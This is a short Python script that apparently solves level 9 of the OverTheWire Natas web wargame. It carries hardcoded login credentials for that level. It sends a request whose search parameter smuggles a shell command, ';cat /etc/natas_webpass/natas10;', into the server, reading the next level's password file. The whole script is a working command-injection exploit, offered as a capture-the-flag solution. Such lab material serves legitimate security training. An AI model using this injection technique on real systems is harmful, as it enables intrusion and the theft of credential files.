import requests

url="http://natas9.natas.labs.overthewire.org/index.php?needle=;cat /etc/natas_webpass/natas10;&submit=Search"
exploit=requests.session()
exploit.auth=('natas9','W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl')
request=exploit.get(url)
#password has been in the source
print(request.text)